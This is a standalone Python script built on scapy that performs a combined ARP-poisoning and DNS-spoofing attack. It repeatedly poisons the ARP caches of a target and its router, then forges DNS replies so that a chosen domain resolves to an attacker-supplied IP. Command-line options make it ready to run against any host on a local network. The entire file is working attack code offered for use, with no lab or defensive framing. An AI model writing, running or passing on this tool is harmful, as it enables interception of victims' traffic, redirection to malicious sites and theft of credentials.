import scapy.all as scapy
import time
import threading
import argparse

# Function to perform ARP poisoning
def arp_poison(target_ip, target_mac, router_ip, router_mac):
    # Create ARP packets for poisoning the ARP cache
    poison_target = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=router_ip)
    poison_router = scapy.ARP(op=2, pdst=router_ip, hwdst=router_mac, psrc=target_ip)

    # Send the poisoned packets
    while True:
        scapy.send(poison_target)
        scapy.send(poison_router)
        time.sleep(2)  # Send every 2 seconds

# Function to listen for DNS queries and send spoofed responses
def dns_spoof(target_ip, spoofed_ip, domain):
    # Create a UDP socket to capture DNS requests
    sniff_filter = "udp and port 53"
    scapy.sniff(filter=sniff_filter, prn=lambda pkt: spoof_dns(pkt, target_ip, spoofed_ip, domain))

# Function to spoof DNS response
def spoof_dns(pkt, target_ip, spoofed_ip, domain):
    if pkt.haslayer(scapy.IP) and pkt.haslayer(scapy.UDP) and pkt.haslayer(scapy.DNS) and pkt[scapy.IP].dst == target_ip:
        dns_query = pkt[scapy.DNS]
        if dns_query.qr == 0 and dns_query.qd.qname.decode("utf-8") == domain:
            print(f"Intercepted DNS request for {domain}!")
            # Craft a DNS response packet
            dns_response = scapy.DNSRR(rrname=dns_query.qd.qname, rdata=spoofed_ip)
            # Create the full DNS response packet
            response_pkt = scapy.IP(dst=pkt[scapy.IP].src, src=pkt[scapy.IP].dst) / \
                           scapy.UDP(dport=pkt[scapy.UDP].sport, sport=53) / \
                           scapy.DNS(id=dns_query.id, qr=1, aa=1, qd=dns_query.qd, an=dns_response)
            # Send the spoofed response to the target
            scapy.send(response_pkt)
            print(f"Spoofed DNS response: {domain} -> {spoofed_ip}")

# Main function to start ARP poisoning and DNS spoofing in parallel
def start_attack(target_ip, target_mac, router_ip, router_mac, domain, spoofed_ip):
    # Start ARP poisoning in a separate thread
    poison_thread = threading.Thread(target=arp_poison, args=(target_ip, target_mac, router_ip, router_mac))
    poison_thread.daemon = True
    poison_thread.start()

    # Start DNS spoofing
    dns_spoof(target_ip, spoofed_ip, domain)

# Argument parser setup
def parse_args():
    parser = argparse.ArgumentParser(description="DNS Spoofing Attack with ARP Poisoning")
    parser.add_argument("-t", "--target-ip", required=True, help="IP address of the target")
    parser.add_argument("-m", "--target-mac", required=True, help="MAC address of the target")
    parser.add_argument("-r", "--router-ip", required=True, help="IP address of the router (gateway)")
    parser.add_argument("-R", "--router-mac", required=True, help="MAC address of the router (gateway)")
    parser.add_argument("-d", "--domain", required=True, help="Domain to spoof (e.g., example.com)")
    parser.add_argument("-s", "--spoofed-ip", required=True, help="IP address to return for the spoofed domain")
    return parser.parse_args()

# Entry point of the script
if __name__ == "__main__":
    # Parse the arguments from the command line
    args = parse_args()

    # Start the attack with the provided arguments
    start_attack(args.target_ip, args.target_mac, args.router_ip, args.router_mac, args.domain, args.spoofed_ip)
